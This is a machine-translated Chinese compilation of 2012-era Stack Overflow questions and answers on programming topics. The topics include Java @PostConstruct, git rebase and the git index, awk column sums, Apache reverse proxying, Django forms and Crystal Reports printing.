 beginBackgroundTaskWithExpirationHandler 
```

然后使用 backgroundTimeRemaining 检查在您尝试在授予的额外时间内完成时还剩多少时间。很明显，您无法在分配的时间保存状态下完成并设置一个标志，指示您在重新启动时需要继续或重新开始。真的没有其他办法，因为 iOS 无法知道你是否完成了你想做的事情，这取决于你

# ruby-on-rails - rails 生成迁移错误 mongo_mapper not found

> ID：13167053
> 
> 赞同：0
> 
> 时间：2012-10-31T20:35:28.767
> 
> 标签：ruby-on-rails, ruby-on-rails-3, mongomapper

按照我添加到 config/application.rb 文件[的 Mongo Mapper Rails 3 中的安装：](http://mongomapper.com/documentation/getting-started/rails.html)

```
config.generators do |g|
  g.orm :mongo_mapper
end 
```

当`rails generate migration my_migration`我得到：

```
error  mongo_mapper [not found] 
```

但是什么时候`rails generate model my_model`，我得到了一个很好的模型类`include MongoMapper::Document`和这个输出：

```
invoke  mongo_mapper
create    app/models/user.rb
invoke    test_unit
create      test/unit/user_test.rb
create      test/fixtures/users.yml 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T11:56:22.453

使用 MongoDB 时没有迁移。因为 MongoDB 是一个无模式的数据库。
这就是您无法使用 mongo mapper 生成迁移的原因。

# java - 派生自具有注解 @PostConstruct 的类

> ID：13167058
> 
> 赞同：35
> 
> 时间：2012-10-31T20:35:43.417
> 
> 标签：java, jakarta-ee, inheritance, annotations

如果您有一个使用`@PostConstruct`注释的父类，并且您创建一个从它派生的子类。`@PostConstruct`每次创建子类的实例时会自动调用该方法吗？因为`@PostConstruct`每次创建父实例时都会调用该方法。

我知道在子类中它会`super();`自动调用我们而无需我们调用它。

我只是不确定如果`@PostConstruct`该子类调用`super();`构造函数是否会自动调用注释。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-10-31T21:55:19.667

测试此场景后，`@PostConstruct`将自动调用基类中的方法。

流程是这样的：

1.  创建子类时，您处于子类的构造函数中，然后您将自动强制进入父类。
2.  完成父类构造函数后，您将被送回子类的构造函数。
3.  子类构造函数完成后，您将自动发送到 PARENT 类`@PostConstruct`方法

# winapi - 当进程不再存在时，GetExitCodeProcess 如何获取退出代码

> ID：13167063
> 
> 赞同：3
> 
> 时间：2012-10-31T20:36:06.633
> 
> 标签：winapi, return-code, openprocess

我首先使用 OpenProcess 处理进程。然后我在循环中调用 GetExitCodeProcess 以查看进程是否正在运行。但是 GetExitCodeProcess 是如何获取退出代码的呢？Windows 是否存储过去 30 分钟内运行的所有进程的退出代码？一旦应用程序退出，有关该进程的任何信息都会从 Windows 中删除。我不知道 GetExitCodeProcess 如何获取不再存在的退出代码...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T20:43:22.070

退出代码保存在进程对象中，在关闭最后一个句柄时销毁。所以在你真正完成之前不要关闭那个手柄！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T20:42:33.990

我认为 Windows 会保留进程退出代码，直到进程的所有句柄都已关闭。`OpenProcess`文档说：

> 此函数返回一个现有进程对象的句柄。完成手柄后，使用该`CloseHandle`功能将其关闭。

# iphone - iOS 6 上的 MapKit 崩溃

> ID：13167065
> 
> 赞同：1
> 
> 时间：2012-10-31T20:36:19.653
> 
> 标签：iphone, ios, ipad, ios6, mapkit

我自己无法重现这个特定的崩溃，但它已通过我们的崩溃报告工具进行了报告，并且我们的数百名用户正在体验它。发现很难调试或重现。

它发生在所有硬件平台上，但仅在 iOS 6 上。任何帮助或见解都将受到高度赞赏。

异常类型：SIGSEGV代码：SEGV_ACCERR

```
Fatal Exception
Thread 0 Crashed
0    MapKit      _remove(objc_object*, MKQuadTrieNode*) + 13
1    MapKit  -[MKQuadTrie remove:] + 54
2    MapKit  -[MKAnnotationContainerView observeValueForKeyPath:ofObject:change:context:] + 252
3    Foundation  NSKeyValueNotifyObserver + 272
4    Foundation  NSKeyValueWillChange + 572
5    Foundation  -[NSObject(NSKeyValueObserverNotification) willChangeValueForKey:] + 180
6    Foundation  NSKVOForwardInvocation + 130
7    CoreFoundation  ___forwarding___ + 626
8    CoreFoundation  _CF_forwarding_prep_0 + 24
9    MapKit  -[MKUserLocation _updateCoordinate] + 106
10   MapKit  -[MKUserLocation setLocation:] + 106
11   MapKit  -[MKMapView(UserPositioningInternal) locationManagerUpdatedLocation:] + 994
12   CoreFoundation  -[NSArray makeObjectsPerformSelector:withObject:] + 206
13   MapKit  -[MKLocationManager _reportLocationStatus:] + 66
14   MapKit  -[MKLocationManager locationProvider:didUpdateLocation:] + 1540
15   MapKit  -[MKCoreLocationProvider locationManager:didUpdateLocations:] + 864
16   CoreLocation    -[CLLocationManager onClientEventLocation:] + 1614
17   CoreLocation    __CLClientInvokeCallback_block_invoke_0 + 64
18   CoreFoundation  __CFRUNLOOP_IS_CALLING_OUT_TO_A_BLOCK__ + 12
19   CoreFoundation  __CFRunLoopDoBlocks + 160
20   CoreFoundation  __CFRunLoopRun + 1450
21   CoreFoundation  CFRunLoopRunSpecific + 356
22   CoreFoundation  CFRunLoopRunInMode + 104
23   GraphicsServices    GSEventRunModal + 74
24   UIKit   UIApplicationMain + 1120
25   App Name   main.m line 14 main + 14 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-31T09:55:26.517

尝试在您使用它的类的 dealloc 方法中将 locationManager 的委托方法设置为 nil

像这样的东西：

```
-(void) dealloc
{
    self.locationManager.delegate = nil;
} 
```

可能发生的情况是对象正在被释放（可能是由于内存不足），并且位置管理器正在尝试向不存在的委托发送消息。

# php - 如何在单独页面的回显中显示模块名称？

> ID：13167076
> 
> 赞同：2
> 
> 时间：2012-10-31T20:37:20.373
> 
> 标签：php

我在“module.php”脚本下面有这段代码，它在每个 ModuleId 和 Module Name 的下拉菜单中显示选项：

```
 $sql = "
    SELECT cm.CourseId, cm.ModuleId, 
    c.CourseName,
    m.ModuleName
    FROM Course c
    INNER JOIN Course_Module cm ON c.CourseId = cm.CourseId
    JOIN Module m ON cm.ModuleId = m.ModuleId
    WHERE
    (c.CourseId = ?)
    ORDER BY c.CourseId, m.ModuleId
    "; 

     $sqlstmt=$mysqli->prepare($sql);

     $sqlstmt->bind_param("s",$course);

     $sqlstmt->execute(); 

     $sqlstmt->bind_result($dbCourseId,$dbModuleId,$dbCourseName,$dbModuleName);

    $moduleHTML  = "";  

     while($sqlstmt->fetch()) { 
        $moduleHTML .= "<option value='$dbModuleId'>" . $dbModuleId . " - " . $dbModuleName . "</option>".PHP_EOL;   
    } 

    echo $moduleHTML; 

     $sqlstmt->execute(); 
```

现在我想在单独的页面（editsession.php）上回显 ModuleId 和 Module Name，现在我已经设法回显 Module Idwhen`$_POST['modules']`但我的问题是我如何回显模块名称？

```
 $moduleHTML = "";  
    $moduleHTML .= '<select name="modules" id="modulesDrop">'.PHP_EOL; 
    $moduleHTML .= '<option value="">Please Select</option>'.PHP_EOL;  
    $moduleHTML .= '</select>'; 

if (isset($_POST['moduleSubmit'])) {    

$outputmodule = ""; 
$outputmodule = "<p><strong>Module:</strong> " . $_POST['modules'] .  " - "  . "//module name" . "</p>"; 
```

# branch - 如何删除乌龟 HG 中的“分支”

> ID：13167077
> 
> 赞同：0
> 
> 时间：2012-10-31T20:37:22.813
> 
> 标签：branch, tortoisehg

我不小心更新到以前的版本，并在默认分支下从它提交，导致默认分支下有 2 个头。我想将其中一个头移到另一个分支。我想移动的这个头是在几笔交易前完成的。如何更改它所属的分支，以便我可以在不强制推送的情况下将另一个头推送到服务器？

到目前为止，我还没有向服务器推送任何内容。如果归根结底，我可以复制我需要的文件并重新克隆存储库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:50:44.053

**您可以使用rebase**扩展重写历史记录。它已经安装了，你只需要启用它（在 tortoiseHG 中从文件 > 设置 > 扩展）。在 tortoiseHG 中你可以找到它，如果你右键点击一个修订，去“修改历史”，然后选择“rebase”。但为了获得更多控制，我建议使用命令行。

假设您有一个修订版`w`，它是默认分支的新负责人。（`w`可能有后代会随之移动）。

```
-o-o-o-o
    \
     w 
```

它的父级应该是`b`另一个分支中的一些修订（未显示）。只需输入：

```
hg rebase --source w --dest b --detach 
```

而已！它将变基`w`和它的所有后代（如果有的话），所以它的新父级是`b`. `b`除非您添加 ，否则它将分配给与 相同的分支名称`--keepbranches`。该标志`--detach`可确保您在某些情况下不会得到复杂的拓扑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T20:53:23.897

1.  变基
2.  Graft（移动到新地方）+ Histedit（杀死旧变更集）
3.  MQ，如果你知道的话（将 cset 转换为 MQ 补丁，更新到新的父级，qpop，qfinish）

# java - 在spring mvc中基于perRequest在objectMapper上添加FiterProvider时线程安全吗？

> ID：13167078
> 
> 赞同：0
> 
> 时间：2012-10-31T20:37:23.613
> 
> 标签：java, spring, jackson

我有以下添加自定义对象映射器的方法。

```
<mvc:annotation-driven>
    <mvc:message-converters>
        <bean class="org.springframework.http.converter.json.CMSMappingJacksonHttpMessageConverter">
            <property name="objectMapper" ref="jsonMapper"/>
        </bean>
    </mvc:message-converters>
</mvc:annotation-driven> 
```

然后在我正在使用的控制器中

@Autowired 私有 ObjectMapper jsonMapper;

在我的一种行动方法中

```
@RequestMapping(produces = "application/json", method = RequestMethod.GET)
public
@ResponseBody
Response get(){
    jsonMapper.setFilters(new SimpleFilterProvider().addFilter(dynamic_per_request));
    return service.get();
} 
```

我只是担心它不会是线程安全的。这是真的吗？如果是，我怎样才能使它线程安全？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T00:01:15.123

不，你不应该那样处理它。您正在动态更改配置，但很有可能在第一个请求实际使用过滤器之前，另一个请求会出现并将其更改为其他内容。

相反，您应该实现线程安全的 FilterProvider，它可以动态地解析您的过滤器，使用类似于`ThreadLocal`传递您需要传递的信息之类的东西。

# java - 使用 nextLine() 后无法创建测试条件

> ID：13167088
> 
> 赞同：2
> 
> 时间：2012-10-31T20:38:38.010
> 
> 标签：java

> **可能重复：**
> [Java String.equals 与 ==](https://stackoverflow.com/questions/767372/java-string-equals-versus)

我一直在使用 nextLine() 获取字符串，然后将其用作测试条件（在 if 语句或 while 循环中）遇到困难。查看 println()，似乎 String 已正确分配给变量“repeat”，但由于某种原因测试条件失败。我的头撞在墙上，额头流血。请帮忙。

```
import java.util.Scanner;

public class potpie {

    public static void main(String args[]){

        Scanner input = new Scanner(System.in);
        String repeat = "yes";

        System.out.println("Type in yes");
        repeat = input.nextLine();
        System.out.println("If repeat is now yes, print yes:  " +repeat);

        if(repeat == "yes"){
            System.out.println("It worked");
        } else
            System.out.println("it failed");
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:39:36.410

你应该使用等于。`==`为您提供参考平等并`equals`为您提供价值平等。

```
if("yes".equals(repeat)){ 
```

代替

```
if(repeat == "yes"){ 
```

* * *

*我建议您获取 eclipse/net bean 并**开始调试**，否则一个简单的搜索就会得到答案*

[`Java Debugging with Eclipse - Tutorial`](http://www.vogella.com/articles/EclipseDebugging/article.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T20:45:38.210

有时 == 应该用于对象，但它实际上比较的是 a 和 b 是否字面上是同一个对象（在内存中具有相同的地址）。正如其他人所说，您正在比较这种情况下的内容，因此您使用 .equals()

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T20:39:13.247

```
if(repeat == "yes"){ 
```

应该

```
if(repeat.equals("yes"){ 
```

（或者）

```
 if("yes".equals(repeat){ 
```

每天我们都会多次看到这个问题，简单的搜索就可以为您提供足够的信息。

`==`equals 用于原始比较（引用相等）。`equals()`用于字符串（或）对象比较（对象内容相等）。

# wtforms - wtforms-recaptcha 有人吗？

> ID：13167093
> 
> 赞同：1
> 
> 时间：2012-10-31T20:39:21.683
> 
> 标签：wtforms

我已经能够让recpatcha正确显示并提交我想将验证码放在前面的表单，但无论您在recaptcha表单中输入什么，它都会验证。

这是我的 wtforms 类：

```
class MessageForm(Form):
  reason_code = SelectField(u'Reason', [validators.Required(message=(u'A reason for contacting us must be selected.'))], default = -1, choices=[('', ''), ('0', 'Advertising'), ('1', 'Comments/Suggestions'), ('2', 'Support')])
  reply_to = TextField(u'Email address', [validators.Required(message=(u'A reply to email address is required.')), validators.Email(message=(u'A valid reply to email address is required.'))])
  message_body =    TextAreaField(u'Message', [validators.Required(u'You must enter a message to submit this form.')])
  captcha = RecaptchaField(u'Captcha', [validators.Required(u'You must properly fill in the Captcha to submit this form.')], public_key=esp_constants.DEV_RECAPTCHA_PUBLIC_KEY, private_key=esp_constants.DEV_RECAPTCHA_PRIVATE_KEY, secure=True) 
```

我正在使用 App Engine，在我的处理程序中我有这个

```
def post(self):
  message_form = MessageForm(self.request.POST, captcha={'ip_address': str(self.request.remote_addr)}) 
```

其他人知道我是否缺少某些东西？表单发布后，RecaptchaField 似乎拥有所有正确的数据（即 challenge_field 等）。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-12-10T22:13:09.263

Flask-WTF 支持 Recaptcha（参见[https://flask-wtf.readthedocs.org/en/latest/](https://flask-wtf.readthedocs.org/en/latest/)），所以也许他们的代码可以帮助你（特别是：[https ://github.com/lepture/flask- wtf/tree/master/flask_wtf/recaptcha](https://github.com/lepture/flask-wtf/tree/master/flask_wtf/recaptcha)）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-19T19:51:20.643

我最终不得不自己动手让 WebApp2、Recaptcha 和 WTForms 的组合在 Google App Engine 中可靠地工作

这基本上就是我在基本控制器中将其作为验证方法处理的方式

[https://gist.github.com/mengelhart/8045030](https://gist.github.com/mengelhart/8045030)

验证码 HTML 片段如下所示：

[https://gist.github.com/mengelhart/8045070](https://gist.github.com/mengelhart/8045070)

至于 recaptcha 字段值，我使用了标准的 HiddenField 而不是这样的 RecaptchaField 类型：

验证码 = HiddenField("ReCaptcha")

干杯

# python - 用户不会在 View 中自动保存，但在 Admin 中会自动保存

> ID：13167094
> 
> 赞同：0
> 
> 时间：2012-10-31T20:39:25.190
> 
> 标签：python, html, django, django-forms, views

构建一个表单以让用户提交帖子和图像。我的模型有一个文本字段、图像、发布日期和作者字段。发布日期和作者自动保存，无需任何用户输入。它使用 admin.py 在管理端工作。但是，当通过视图显示它时，它不起作用。为什么？

```
#models.py
    class Question(models.Model):
    text            = models.CharField(max_length = 500)
    image           = models.ImageField(upload_to = 'movie_poster')
    pub_date        = models.DateTimeField(auto_now_add = True)
    author          = models.ForeignKey(User)

    def __unicode__(self):
        return self.title

    class QuestionForm(ModelForm):
        class Meta:
             model = Question
             exclude = ('author', 'pub_date')
#views.py
def add_question(request):
     def save_model(self, request, obj, form, change):
        obj.author = request.user
        obj.save()
     if request.method == "POST":
        form = QuestionForm(request.POST, request.FILES)   
        if form.is_valid():
            form.save()
            return HttpResponseRedirect("/home/")
    else:
        form = QuestionForm
        return render_to_response("qanda/add_question.html", {'form': form}, context_instance = RequestContext(request))

#add_question.html
{% block content %}

<div class="loginform">
    <h1> Add Movie:</h1>
    <form enctype = "multipart/form-data" action = "" method = "post">{% csrf_token %}
        {{ form.as_p }}
        <input type = "submit" value = "Add" />
        <input type = "hidden" name = "next" value = "{{ next|escape }}" />
    </form>
{% endblock %} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:03:15.430

`save_model`不是只要在那儿就可以无处不在的魔法。我们需要自定义表单：

```
class QuestionForm(ModelForm):
    def save(self, user=None, force_insert=False, force_update=False, commit=True):
        q = super(QuestionForm, self).save(commit=False)
        q.author = user
        if commit:
            q.save()
        return q

    class Meta:
        model = Question
        exclude = ('author', 'pub_date')

def add_question(request):
    if request.method == "POST":
        form = QuestionForm(request.POST, request.FILES)
        if form.is_valid():
            form.save(user=request.user)
            return HttpResponseRedirect("/home/")
    else:
        form = QuestionForm()
        return render_to_response("qanda/add_question.html", {'form': form}, context_instance=RequestContext(request)) 
```

# git - Git：什么是索引

> ID：13167099
> 
> 赞同：4
> 
> 时间：2012-10-31T20:39:39.533
> 
> 标签：git, git-index

![在此处输入图像描述](../Images/b303813cb44ed49ff93c2b1e1e299e18.png)

从这张图片中，提交是指向根树的指针，根树是指向其他树和 blob 的指针。但是什么是正确的索引视图？

问题：

*   它是具有文件夹结构的类似树状结构还是只是 blob 的平面视图？

*   如果索引是树状的，那么提交和索引之间有很大区别吗？

*   索引看起来更像是完整快照还是差异？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:42:58.177

从概念上讲，索引是一棵树。它存储了 HEAD 的状态，反映了所有的变化`git add`。提交时，索引只是成为提交中的树。您可能会问索引实际上是如何实现的？我猜它确实是一棵树，但我不确定。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-01T16:54:00.043

与此问题相同的答案：[Decoding Git index file using C#](https://stackoverflow.com/questions/8366963/decoding-git-index-file-using-c-sharp)

此处描述了 Git 索引文件格式：http: [//git.kernel.org/?p=git​​/git.git;a=blob;f=Documentation/technical/index-format.txt;hb=HEAD](http://git.kernel.org/?p=git/git.git;a=blob;f=Documentation/technical/index-format.txt;hb=HEAD)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-12-17T20:07:19.427

索引是暂存文件的集合。或者我们可以说所有添加的文件。缓存是索引的过时名称，对我来说更容易理解。

提交后，索引变为 HEAD，即当前分支的头部。

如果要丢弃索引中的一个文件，可以使用 `$git reset HEAD <filename>`它来完成。

# apache - Apache WebSphere 插件主页

> ID：13167101
> 
> 赞同：1
> 
> 时间：2012-10-31T20:39:50.423
> 
> 标签：apache, plugins, websphere, websphere-7

我们目前有 Apache/WAS 设置，我希望 Apache 处理静态内容并且它按预期工作。

我的问题：

以前我们一直用www.xxx.com，用WAS来处理页面，现在想在WEB服务器处理页面，在用户不知情的情况下将www.xxx.com路由到www.xxx.com/index.jsp它。

我们希望用户在 url 中输入 www.xxx.xom 并通过 Apache 访问 WAS。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:55:22.160

如果我没听错的话，您需要一个反向代理来处理您网站的动态内容。Apache[`mod_proxy`](http://httpd.apache.org/docs/2.2/mod/mod_proxy.html)允许您对选择性 URL 执行此操作。该[`ProxyPass`](http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypass)指令允许您指定哪些 URL 映射到哪些 HTTP 服务器。相应地修改 HTTP 标头，以使外部信息可以到达隐藏在 Apache 后面的 WAS。IIRC，WAS 可以配置为知道反向代理。

基于前缀的反向代理：

```
ProxyPass /mirror/foo/ http://backend.example.com/ 
```

基于正则表达式的反向代理：

```
ProxyPassMatch ^(/.*\.gif)$ http://backend.example.com$1 
```

# entity-framework - 重置 ADO.NET 架构

> ID：13167108
> 
> 赞同：0
> 
> 时间：2012-10-31T20:40:07.770
> 
> 标签：entity-framework, ado.net, odp.net

我修改了一个模式（将一个字段设置为不可为空），但是当我尝试使用 ADO.NET 重新创建映射时，我只看到旧模式。

.edmx 文件如下所示：

```
 <EntityType Name="STG_DW_BUF_CODE_D">
          <Key>
            <PropertyRef Name="BUF_CODE_KEY" />
          </Key>
          <Property Name="BUF_CODE_KEY" Type="number" Nullable="false" />

…
      <EntityType Name="STG_DW_REGION_D">
        <Property Name="REGION_KEY" Type="number" /> 
```

STG_DW_REGION_D 视图应该像上面的视图一样具有 Nullable="false"。

我可以通过另一个 SQL 应用程序确认新模式的该字段不可为空，但我无法让 ADO.NET 注意到。

我尝试擦除模型并重新创建它。我尝试关闭视觉工作室并重新启动它。它仍然看到旧模式。

有谁知道如何重置它？有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T14:23:47.803

这是 ADO.NET 或 ODP（Oracle 与 Linq 的连接）中的错误。如果您添加一个字段，它将删除缓存的架构并使用*更新*的字段属性拉入一个新架构。

# php - 检索 Sphinx 搜索匹配的文本上下文

> ID：13167109
> 
> 赞同：1
> 
> 时间：2012-10-31T20:40:17.470
> 
> 标签：php, search, sphinx

由于 Sphinx 只返回 ID，因此很难判断匹配文本中实际匹配的位置。当然，这也取决于搜索模式：文档中可能有更多匹配项，`SPH_MATCH_ANY`或者只有一个`SPH_MATCH_PHRASE`。

当匹配模式设置为`SPH_MATCH_PHRASE`时，很容易检索实际匹配的文本上下文，例如查找`strpos("Exact phrase", $string)`. `SPH_MATCH_ANY`用or怎么可能达到同样的效果`SPH_MATCH_ALL`？有没有一种方法可以让 Sphinx 将`strpos`（指针）返回到最相关的匹配项或仅返回第一个匹配项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T07:51:11.127

您可以使用[BuildExcerpts](http://sphinxsearch.com/docs/current.html#api-func-buildexcerpts)函数来检查特定文本中匹配的内容。

# git - 一个 github 存储库中的多个子存储库

> ID：13167116
> 
> 赞同：1
> 
> 时间：2012-10-31T20:40:46.330
> 
> 标签：git

我正在使用凉亭，我想做很多自定义组件。

Bower 它只是一个包管理器，给它一个 git uris 列表，它会将它们克隆到你的“组件”文件夹中，现在这太棒了，我想做的是给它一个 4 或 5 个 repos 的列表，那些将是我创建的所有自定义包，但我不想在 github 上创建 4 或 5 个不同的存储库，每个组件一个，我可以创建一个存储库并以某种方式添加 4 或 5 个子存储库吗？

我不能使用分支，因为似乎 clone 总是克隆 master 分支。（我不太擅长 git，所以请多多包涵）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:53:31.743

如果该包管理器希望“组件”成为回购，我想你必须制作不同的回购。

你可以专门为这个项目创建一个新的 Github 帐户，并在那里设置所有需要的 repos，以保持你的帐户干净。

我认为您可以通过使用 git 标签来解决这个问题：在您的一个 git 存储库的历史记录中将每个组件设置在不同的标签上，并将它们用作“同一存储库的版本”。就像是：

```
 add comp-1 to your repo
git-tag 1: comp-1
  remove comp-1 from the repo
  add comp-2 to the repo
git-tag 2: comp2 
```

不过，我绝对不会那样做。

# bash - 如何将任何列值的总和添加到制表符分隔文件中最后一条记录的最后一列

> ID：13167117
> 
> 赞同：4
> 
> 时间：2012-10-31T20:40:46.960
> 
> 标签：bash, unix, sed, awk

我需要取 col2 的总和并将值添加到最后一条记录的最后一列。请指教，我们如何使用 UNIX shell 脚本来实现这一点。

```
E.g Input file:
Col1    Col2    Col3    Col4
abc 2   A   null
bcd 3   B   null
adf 4   C   null

Output file
Col1    Col2    Col3    Col4
abc 2   A   null
bcd 3   B   null
adf 4   C   9 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:31:42.993

假设您想在输出中保留空白：

```
$ awk '{sum+=$2; s=s $0 ORS} END{ sub("null"ORS"$",sum,s); print s}' file
Col1    Col2    Col3    Col4
abc 2   A   null
bcd 3   B   null
adf 4   C   9 
```

或者：

```
$ awk '{sum+=$2; printf "%s",p} {p=$0 ORS} END{ sub("null$",sum); print}' file
Col1    Col2    Col3    Col4
abc 2   A   null
bcd 3   B   null
adf 4   C   9 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T20:48:52.070

我认为这个 awk 脚本会做到这一点：

```
awk '{sum+=$2; if (NR != 4) print; } END {$4=sum; print;}' infile 
```

**编辑：**甚至更好：

```
awk '{sum+=$2; if (NR>1) print x; x=$0} END {$4=sum; print $0;}' infile 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T22:43:18.023

这是一种使用方法`GNU awk`：

```
awk -v last="$(wc -l < file.txt)" 'NR == 1 { print; next } { sum += $2 } NR == last { sub($NF, sum) }1' file.txt 
```

结果：

```
Col1    Col2    Col3    Col4
abc 2   A   null
bcd 3   B   null
adf 4   C   9 
```

# jmdns - 在地址.arpa。响应未触发 ServiceListener 中的回调

> ID：13167125
> 
> 赞同：0
> 
> 时间：2012-10-31T20:41:37.080
> 
> 标签：jmdns

我正在尝试设置一些 ServiceListeners，特别是两个：

```
zeroConf.addServiceListener("100.1.168.192.in-addr.arpa.", myListener);
zeroConf.addServiceListener("_workstation._tcp.local.", myListener); 
```

每当我这样做时，我都会在 serviceResolved() 和 serviceAdded() 上为匹配“_workstation._tcp.local”的所有服务获取 myListener 的回调。但是，我没有收到“100.1.168.192.in-addr.arpa”的回调。...尽管 jmDns 发送了查询，并且响应回来了！我附上了 jmdns 发出的请求数据包的 tcpdump 以及返回的响应。但是，没有调用回调，所以我在我的应用程序中看不到响应。

有谁知道为什么会发生这种情况？

[http://users.ece.cmu.edu/~gnychis/jmdns_nocallback.pcap](http://users.ece.cmu.edu/~gnychis/jmdns_nocallback.pcap)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T19:07:50.050

在对传入的实际事件类型进行一些调试后，事件类型解析为“_tcp.in-addr.arpa”。将此添加到我的服务侦听器会触发回调。

# c# - 从 VS 2008 升级到 VS 2010 后出现“数据库登录失败”错误

> ID：13167127
> 
> 赞同：0
> 
> 时间：2012-10-31T20:42:07.063
> 
> 标签：c#, visual-studio-2010, crystal-reports

我有一个用 VS 2008 为 .net 2 编写的应用程序，升级到 VS 2010 并为 .net 4 构建。在这个应用程序中是一个 Crystal Report。报告应该绝对没有数据库交互。我从项目中的一个对象中手动设置了各种 ITextObject 字段。

例子：

```
 to = (CrystalDecisions.CrystalReports.Engine.TextObject)crystalPrint.Section2.ReportObjects["tbName"];
            to.Text = visitor.first + " " + visitor.last;

            to = (CrystalDecisions.CrystalReports.Engine.TextObject)crystalPrint.Section2.ReportObjects["tbCompany"];
            to.Text = visitor.company; 
```

`visitor`我从中提取数据的类在哪里。

同样，该报告绝对不应该与数据库交互，但是，它以某种方式认为它应该访问数据库。

这是相关的堆栈跟踪：CrystalDecisions.ReportAppServer.DataSetConversion

编辑：当我打电话时它正在爆炸`.PrintToPrinter(1, false, 1, 0);`

*编辑/更新*我戳进了app.config文件，我发现了这个小块

```
<startup useLegacyV2RuntimeActivationPolicy="true">
<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
</startup> 
```

在应用程序中，我的报告会打印出来。注释掉之后，它就炸了......

编辑 3：

更多源代码：

```
 cryBadge crystalPrint = new cryBadge();
 crystalPrint.ReportOptions.EnableSaveDataWithReport = false;

 //NOTE: pi is an internal object used to find printer information.
 crystalPrint.PrintOptions.PrinterName = pi.PrinterName;
 numSize = pi.FindPaperSizeIndex(height, wid);
 to = (CrystalDecisions.CrystalReports.Engine.TextObject)crystalPrint.Section2.ReportObjects["tbName"];
            to.Text = visitor.first + " " + visitor.last;

 to = (CrystalDecisions.CrystalReports.Engine.TextObject)crystalPrint.Section2.ReportObjects["tbCompany"];
 to.Text = visitor.company;
 crystalPrint.PrintOptions.PaperOrientation = CrystalDecisions.Shared.PaperOrientation.Landscape;
 crystalPrint.PrintToPrinter(1, false, 1, 0); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:29:34.890

例如，如果我想使用 Crystal Reports 打印报表，我会执行以下操作

根据你的例子

```
.PrintToPrinter(1, false, 1, 0); 
```

你可能想尝试重构你的代码这里是一个例子

```
ReportDocument rd = new ReportDocument();
// Insert code to run the report here

// This gets the user's default printer to print to.
PrintDialog prt = new PrintDialog();
rd.PrintOptions.PrinterName = prt.PrinterSettings.PrinterName; 
// This does the printing.
rd.PrintToPrinter(copies, true, 1, 1000); 
```

您也可以在下面尝试一个工作示例..

```
//Note untested
PrintDialog pDialog = new PrintDialog();

Nullable<Boolean> print = pDialog.ShowDialog();
if (print == true)
{
    string value1 = "This is a Test";
    string value2= "Happy Halloween";
    ReportDocument rd = new ReportDocument();
    rd.Load("ReportFile.rpt");
    rd.SetParameter("Parameter1", value1);
    rd.SetParameter("Parameter2", value2);
    rd.PrintOptions.PrinterName = pd.PrinterSettings.PrinterName;
    rd.PrintToPrinter(1, false,0,0);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:11:23.200

好的。弄清楚了。

我必须将此代码块输入到 app.config 文件中：

```
<startup useLegacyV2RuntimeActivationPolicy="true">
<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
</startup> 
```

然后确保配置文件与 .exe 保持一致。例如，如果应用名为“TestApp1”，则输出文件夹中应该有一个 TestApp1.exe.config 文件。该 .config 文件需要保留在应用程序中。

# python - 如何对角翻转图片

> ID：13167128
> 
> 赞同：1
> 
> 时间：2012-10-31T20:42:22.567
> 
> 标签：python, jython, jes

像这样

[http://imgur.com/a/rPyKb](http://imgur.com/a/rPyKb)

这就是我所拥有的，但它不起作用，我不知道为什么。

```
def mirrorDiagonal(picture):
  for sourceX in range(0,getWidth(picture)):
    for sourceY in range (0,getHeight(picture)):
      pex=getPixel(picture,sourceY,sourceX)
      pix=getPixel(picture, sourceX,sourceY)
      color=getColor(pix)
      setColor(pex,color) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:32:17.103

编辑了这篇文章，因为我错了。

正如 Jan 所说，如果你想保留一半的图片，你必须考虑不要覆盖所有的像素。

它应该是这样的：

```
def mirrorDiagonal(picture):
    for sourceX in range(0,getWidth(picture)):
        for sourceY in range (sourceX,getHeight(picture)):
            pex=getPixel(picture,sourceY,sourceX)
            pix=getPixel(picture, sourceX,sourceY)
            color=getColor(pix)
            setColor(pex,color) 
```

不过，您可能想考虑一下您想要翻转的对角线。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:07:27.067

假设您处于蓝色的位置 (x,y)=(7,8)，算法会将 (8,7)（绿色）像素变为蓝色。当您的循环到达点 (8,7) 时，它将从先前的分配中发现它是蓝色的，并且您不再拥有原始颜色（绿色）。结果，您最终会保持右上角的对角线不变，并且它的反射在左下角。

为了恢复左下角的原始值，您需要将它们存储在某个地方并在 x > y 时使用它们（图片的左下部分）

